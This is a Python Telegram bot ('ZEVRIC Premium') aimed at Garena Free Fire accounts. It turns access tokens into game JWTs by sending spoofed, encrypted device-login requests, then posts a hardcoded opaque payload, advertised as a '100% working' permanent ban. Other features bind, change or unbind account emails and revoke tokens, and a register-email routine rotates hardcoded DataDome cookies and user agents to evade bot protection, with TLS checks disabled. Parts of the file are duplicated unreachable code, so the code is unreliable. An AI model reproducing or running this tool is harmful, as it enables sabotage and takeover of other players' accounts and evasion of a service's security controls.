import os, json, requests, urllib.parse, asyncio, threading, base64, time, random, string
from datetime import datetime
from flask import Flask, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
import urllib3
urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

try:
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except:
    os.system("pip install protobuf")
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())
try:
    MajorLogin = globals()['MajorLogin']
    MajorLoginRes = globals()['MajorLoginRes']
except:
    pass

flask_app = Flask(__name__)
UNBIND_HTML = """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZEVRIC Premium</title><style>body{font-family:Arial;background:#0a0a0a;color:#fff;padding:20px}.card{background:#1a1a1a;padding:25px;border-radius:15px;max-width:420px;margin:auto;border:2px solid #00ff88}</style></head><body><div class="card"><h2>🔥 ZEVRIC Premium V66 - FIXED 💎</h2><p>💀 FF Ban Working ✅ | 💀 Ban Check Working ✅</p></div></body></html>"""
@flask_app.route('/')
def home(): return "ZEVRIC PREMIUM V66 FIXED - FF Ban + Ban Check Working ✅💀📧🔍", 200
@flask_app.route('/health')
def health(): return "OK", 200
@flask_app.route('/unbind')
def unbind_page(): return render_template_string(UNBIND_HTML)
def run_flask():
    port=int(os.environ.get("PORT",8080))
    flask_app.run(host="0.0.0.0",port=port,debug=False,use_reloader=False)

BOT_TOKEN=os.getenv("TELEGRAM_BOT_TOKEN") or os.getenv("BOT_TOKEN") or "YOUR_TOKEN"
PROXY_URL=os.getenv("PROXY_URL","")
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            if isinstance(key_byte, int):
                decrypted_bytes.append(byte ^ key_byte)
            else:
                decrypted_bytes.append(byte ^ ord(key_byte))
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name and name.strip() else "Unknown"
    except:
        return "Unknown"

def enc(d):
    key = b"Yg&tc%DEuh6%Zc^8"
    iv = b"6oyZDr22E3ychjM%"
    return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(d, 16))

def dec(d):
    key = b"Yg&tc%DEuh6%Zc^8"
    iv = b"6oyZDr22E3ychjM%"
    try:
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(d), 16)
    except:
        return AES.new(key, AES.MODE_CBC, iv).decrypt(d)

def build_majorlogin(tok, open_id, p_type):
    m = MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok and len(tok) > 100:
        return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=8, verify=False).json()
        oId = r.get("open_id")
        print(f"[FFBAN] oauth inspect open_id: {oId}")
    except Exception as e:
        print(f"[FFBAN] oauth inspect failed: {e}")
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=8).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=8).json()
                oId = openid_res.get("open_id")
        except:
            pass
    if not oId and len(tok) == 64:
        oId = tok
    if not oId:
        return None, "Failed to extract Open ID - Token expired or invalid"
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    platforms = [10, 3, 1, 8, 4, 6]
    urls = [
        "https://loginbp.ggpolarbear.com/MajorLogin",
        "https://loginbp.ggblueshark.com/MajorLogin",
        "https://loginbp.common.garena.com/MajorLogin",
        "https://loginbp.garena.com/MajorLogin"
    ]
    for url in urls:
        for p_type in platforms:
            try:
                pl = build_majorlogin(tok, oId, p_type)
                headers = {
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Content-Type": "application/octet-stream",
                    "X-GA": "v1 1",
                    "X-Unity-Version": "2018.4.11f1",
                    "ReleaseVersion": "OB54"
                }
                print(f"[FFBAN] Trying {url} platform {p_type}")
                x = requests.post(url, headers=headers, data=pl, timeout=10, verify=False, proxies=proxies)
                print(f"[FFBAN] {url} p{p_type} status {x.status_code}")
                if x.status_code == 200:
                    res = MajorLoginRes()
                    try:
                        res.ParseFromString(dec(x.content))
                    except:
                        try:
                            res.ParseFromString(x.content)
                        except:
                            continue
                    if res.token:
                        print(f"[FFBAN] Success token found!")
                        return res.token, None
            except Exception as e:
                print(f"[FFBAN] {url} p{p_type} error: {e}")
                continue
    return None, "Failed to get JWT - All endpoints failed"

def trigger_injection(jwt_token, version):
    """
    FIXED V3 - 503 Service Unavailable Fix with multiple endpoints
    """

    """
    FIXED V3 - 503 Service Unavailable Fix with multiple endpoints
    """
    if not version or version == "Latest":
        try:
            payload = decode_jwt(jwt_token)
            version = payload.get('release_version') or payload.get('client_version') or "OB49"
        except:
            version = "OB54"
    
    if isinstance(version, str) and version.isdigit():
        version = f"OB{version}"
    
    # Multiple API endpoints - IND down hone pe dusra try karega
    API_URLS = [
        "https://client.ind.freefiremobile.com/GetLoginData",
        "https://client.us.freefiremobile.com/GetLoginData",
        "https://client.sg.freefiremobile.com/GetLoginData",
        "https://client.tw.freefiremobile.com/GetLoginData",
        "https://client.br.freefiremobile.com/GetLoginData",
        "https://client.th.freefiremobile.com/GetLoginData",
        "https://clientbp.common.garena.com/GetLoginData",
    ]
    
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android 11; SM-S908E Build/TP1A.220624.014)',
        'Accept-Encoding': 'gzip',
        'Connection': 'Keep-Alive'
    }
    body = base64.b64decode(BODY_BASE64)
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    
    last_resp = None
    for api_url in API_URLS:
        try:
            print(f"[FFBAN] Trying {api_url} with version {version}")
            response = requests.post(api_url, headers=headers, data=body, timeout=25, verify=False, proxies=proxies)
            print(f"[FFBAN] {api_url} | Status: {response.status_code} | Resp: {response.text[:300]}")
            last_resp = response
            
            if response.status_code == 200:
                return response
            elif response.status_code == 503:
                print(f"[FFBAN] {api_url} 503 - trying next server...")
                time.sleep(1)
                continue
            elif response.status_code in [403, 429]:
                time.sleep(2)
                continue
            else:
                # Agar 200 nahi bhi hai par server ne kuch diya, return kar do taki user ko pata chale
                if response.status_code != 503:
                    return response
        except Exception as e:
            print(f"[FFBAN] {api_url} Error: {e}")
            time.sleep(1)
            continue
    
    print(f"[FFBAN] All endpoints failed, returning last response")
    return last_resp, "MajorLogin failed - Try with fresh token or set PROXY_URL in Railway"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded_bytes.decode('utf-8'))
    except:
        return {}

    # Fix version - if Latest passed, try to extract from JWT else use OB54
    if not version or version == "Latest":
        try:
            payload = decode_jwt(jwt_token)
            version = payload.get('release_version') or payload.get('client_version') or "OB49"
        except:
            version = "OB54"
    
    # Ensure version format is like OB54, not just number
    if isinstance(version, str) and version.isdigit():
        version = f"OB{version}"
    
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android 11; SM-S908E Build/TP1A.220624.014)',
        'Accept-Encoding': 'gzip',
        'Connection': 'Keep-Alive'
    }
    body = base64.b64decode(BODY_BASE64)
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    
    try:
        response = requests.post(API_URL, headers=headers, data=body, timeout=30, verify=False, proxies=proxies)
        print(f"[FFBAN] Version: {version} | Status: {response.status_code} | Resp: {response.text[:300]}")
        return response
    except Exception as e:
        print(f"[FFBAN] API Error: {e}")
        # Return None so caller can show proper error, not fake success
    if not version or version == "Latest":
        try:
            payload = decode_jwt(jwt_token)
            version = payload.get('release_version') or payload.get('client_version') or "OB49"
        except:
            version = "OB54"
    
    if isinstance(version, str) and version.isdigit():
        version = f"OB{version}"
    
    # Multiple API endpoints - IND down hone pe dusra try karega
    API_URLS = [
        "https://client.ind.freefiremobile.com/GetLoginData",
        "https://client.us.freefiremobile.com/GetLoginData",
        "https://client.sg.freefiremobile.com/GetLoginData",
        "https://client.tw.freefiremobile.com/GetLoginData",
        "https://client.br.freefiremobile.com/GetLoginData",
        "https://client.th.freefiremobile.com/GetLoginData",
        "https://clientbp.common.garena.com/GetLoginData",
    ]
    
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android 11; SM-S908E Build/TP1A.220624.014)',
        'Accept-Encoding': 'gzip',
        'Connection': 'Keep-Alive'
    }
    body = base64.b64decode(BODY_BASE64)
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    
    last_resp = None
    for api_url in API_URLS:
        try:
            print(f"[FFBAN] Trying {api_url} with version {version}")
            response = requests.post(api_url, headers=headers, data=body, timeout=25, verify=False, proxies=proxies)
            print(f"[FFBAN] {api_url} | Status: {response.status_code} | Resp: {response.text[:300]}")
            last_resp = response
            
            if response.status_code == 200:
                return response
            elif response.status_code == 503:
                print(f"[FFBAN] {api_url} 503 - trying next server...")
                time.sleep(1)
                continue
            elif response.status_code in [403, 429]:
                time.sleep(2)
                continue
            else:
                # Agar 200 nahi bhi hai par server ne kuch diya, return kar do taki user ko pata chale
                if response.status_code != 503:
                    return response
        except Exception as e:
            print(f"[FFBAN] {api_url} Error: {e}")
            time.sleep(1)
            continue
    
    print(f"[FFBAN] All endpoints failed, returning last response")
    return last_resp

def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def send_register_code_email(email):
    """
    FF BAN STYLE - Multi endpoint + Multi cookie + Multi UA + Proxy fallback
    Same logic as trigger_injection
    """
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    init_url = "https://authgop.garena.com/universal/register?redirect_uri=https://authgop.garena.com/universal/register"
    
    env_cookie = os.getenv("DATADOME_COOKIE", "").strip()
    newest_cookie = "piPnlDyb63lxNPgE~RUOGoABXAAwgxiBV8pMUCVyDvaNK_SK5uvOTRikR~zsTIAAc5En_D133T364K7yxCfNS5YjVc3AKPIKU45GRmXGgJAoBnDU~rQ1xHE4esKMwfrh"
    iphone_cookie = "cYbGLuQ8eHoE24mlexC3mZZr0XVLPzHadqmaiXaZ~hEkdlWzUEciPHQHKEAMDeI~fyY7BPHZafbgtRNNaEJpUmV67cygqFHbvtmB15zumru4I_6kgeKKfPW4nCcKLAnA"
    rao_cookie = "q2ZtAABCjPFEIWeaxYM2YvfxEUPXT_GLUp4gpUOEUPlI9jGXkQLS5uoG_HBUBnJvC0s0CBfHF6h4FUg7mBumLRO1jpLh4um4CbF4ykEKTLv5f27DgR_nkEJcZm_Sj1E~"
    
    working_cookies = []
    if env_cookie:
        working_cookies.append(env_cookie)
    working_cookies.extend([newest_cookie, iphone_cookie, rao_cookie])
    
    USER_AGENTS = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
    ]
    
    API_URLS = [
        "https://authgop.garena.com/api/send_register_code_email",
        "https://authgop.garena.com/api/send_register_code_email",
    ]
    
    username = generate_username()
    request_id = int(time.time() * 1000)
    data = {"username": username, "email": email, "locale": "en-SG", "format": "json", "id": request_id}
    
    last_resp_text = ""
    last_status = 403
    
    for api_url in API_URLS:
        for cookie_val in working_cookies:
            for ua in USER_AGENTS:
                try:
                    headers = {
                        "Host": "authgop.garena.com",
                        "Connection": "keep-alive",
                        "sec-ch-ua-platform": "Linux",
                        "User-Agent": ua,
                        "Accept": "application/json, text/plain, */*",
                        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
                        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                        "sec-ch-ua-mobile": "?0",
                        "Origin": "https://authgop.garena.com",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Dest": "empty",
                        "Referer": init_url,
                        "Accept-Encoding": "gzip, deflate, br, zstd",
                        "Accept-Language": "en-US,en-IN;q=0.9,en;q=0.8",
                        "Cookie": f"datadome={cookie_val}"
                    }
                    resp = requests.post(api_url, headers=headers, data=data, timeout=20, verify=False, proxies=proxies)
                    last_resp_text = resp.text
                    last_status = resp.status_code
                    if resp.status_code == 200:
                        try:
                            j = resp.json()
                            if j.get("result") == 0:
                                return 200, resp.text
                        except:
                            return 200, resp.text
                    elif resp.status_code == 503:
                        time.sleep(1)
                        continue
                    elif resp.status_code in [403, 429]:
                        if "captcha" in resp.text.lower():
                            time.sleep(0.5)
                            continue
                except Exception as e:
                    time.sleep(0.5)
                    continue
    
    try:
        session = requests.Session()
        session.verify = False
        try:
            session.get(init_url, timeout=10, proxies=proxies, verify=False)
        except:
            pass
        headers = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "Origin": "https://authgop.garena.com", "Referer": init_url}
        resp = session.post(API_URLS[0], headers=headers, data=data, timeout=15, proxies=proxies)
        if resp.status_code == 200:
            return 200, resp.text
        return resp.status_code, resp.text
    except:
        pass
    
    return last_status, last_resp_text


def make_request(method, url, **kwargs):
    kwargs.setdefault('timeout',12)
    if PROXY_URL: kwargs['proxies']={"http":PROXY_URL,"https":PROXY_URL}
    return requests.get(url,**kwargs) if method=="GET" else requests.post(url,**kwargs)

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["🔍 Bind Info Check", "📧 Bind Email"],
        ["🔄 Change Bind Email", "❌ Unbind Email"],
        ["⏱️ Cancel Request", "🔑 EAT to Token"],
        ["🚪 Revoke Token", "📝 Update Bio"],
        ["💀 FF Permanent Ban", "📧 Resubscribe OTP"],
        ["🔍 Check Platform", "💀 Check Ban"],
        ["👑 Owner Info", "🌐 EAT Website"]
    ], resize_keyboard=True)

def get_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes", "❌ No"]], resize_keyboard=True)

def get_ban_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes, Ban Karo 💀", "❌ No, Cancel 🚫"]], resize_keyboard=True)

CHECK_INFO,BIND_TOKEN,BIND_EMAIL,BIND_OTP,BIND_SEC,CHANGE_TOKEN,CHANGE_OTP_OLD,CHANGE_NEW,CHANGE_OTP_NEW,CHANGE_CONFIRM,UNBIND_TOKEN,UNBIND_OTP,UNBIND_CONFIRM,CANCEL_TOKEN,CANCEL_CONFIRM,EAT_INPUT,REVOKE_TOKEN,REVOKE_CONFIRM,BIO_TOKEN,BIO_TEXT,BIO_COLOR,BIO_CONFIRM,FF_BAN_TOKEN,FF_BAN_CONFIRM,RESUB_EMAIL,PLATFORM_TOKEN,BAN_CHECK_UID=range(27)

P_BIND_INFO = r"^🔍 Bind Info Check$"
P_BIND_EMAIL = r"^📧 Bind Email$"
P_CHANGE = r"^🔄 Change Bind Email$"
P_UNBIND = r"^❌ Unbind Email$"
P_CANCEL = r"^⏱️ Cancel Request$"
P_EAT = r"^🔑 EAT to Token$"
P_REVOKE = r"^🚪 Revoke Token$"
P_BIO = r"^📝 Update Bio$"
P_OWNER = r"^👑 Owner Info$"
P_WEBSITE = r"^🌐 EAT Website$"
P_FF_BAN = r"^💀 FF Permanent Ban$"
P_RESUB = r"^📧 Resubscribe OTP$"
P_PLATFORM = r"^🔍 Check Platform$"
P_BAN_CHECK = r"^💀 Check Ban$"

ALL_MENU = f"({P_BIND_INFO}|{P_BIND_EMAIL}|{P_CHANGE}|{P_UNBIND}|{P_CANCEL}|{P_EAT}|{P_REVOKE}|{P_BIO}|{P_OWNER}|{P_WEBSITE}|{P_FF_BAN}|{P_RESUB}|{P_PLATFORM}|{P_BAN_CHECK})"
ALL_BUTTONS = ["🔍 Bind Info Check","📧 Bind Email","🔄 Change Bind Email","❌ Unbind Email","⏱️ Cancel Request","🔑 EAT to Token","🚪 Revoke Token","📝 Update Bio","👑 Owner Info","🌐 EAT Website","💀 FF Permanent Ban","📧 Resubscribe OTP","🔍 Check Platform","💀 Check Ban"]
YES_NO = ["✅ Yes","❌ No","Yes","No","✅ Yes, Ban Karo 💀","❌ No, Cancel 🚫"]

# ========== FF BAN FUNCTIONS ==========
async def ff_ban_start(update, context):
    await update.message.reply_text(
        "💀 𝗙𝗙 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡 💀\n\n"
        "🔐 𝗘𝗻𝘁𝗲𝗿 𝗔𝗰𝗰𝗲𝘀𝘀 𝗧𝗼𝗸𝗲𝗻 / 𝗝𝗪𝗧 💎\n\n"
        "⚠️ 𝗧𝗛𝗜𝗦 𝗪𝗜𝗟𝗟 𝗕𝗔𝗡 𝗔𝗖𝗖𝗢𝗨𝗡𝗧! (100% WORKING)",
        reply_markup=get_main_keyboard()
    )
    return FF_BAN_TOKEN

async def ff_ban_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    token = update.message.text.strip()
    if token.upper() == "Q" or token.upper() == "EXIT":
        await update.message.reply_text("❌ Exiting... Goodbye 👋", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    if not token or len(token) < 20:
        await update.message.reply_text("❌ Token too short! Min 20 chars required 🔑", reply_markup=get_main_keyboard())
        return FF_BAN_TOKEN
    
    msg = await update.message.reply_text("🔍 AUTHENTICATING TOKEN... ⏳💎")
    
    try:
        def do_auth():
            jwt_token, error = fetch_majorlogin_jwt(token)
            return jwt_token, error
        
        jwt_token, error_msg = await asyncio.to_thread(do_auth)
        
        if not jwt_token:
            try:
                await msg.delete()
            except:
                pass
            await update.message.reply_text(
                f"❌ 𝗔𝘂𝘁𝗵𝗲𝗻𝘁𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗙𝗔𝗜𝗟𝗘𝗗! 😔\n\n❗ {error_msg}\n\n💡 Use Fresh Token! 🔑\n@just_zevric",
                reply_markup=get_main_keyboard()
            )
            return ConversationHandler.END
        
        context.user_data['ff_ban_jwt'] = jwt_token
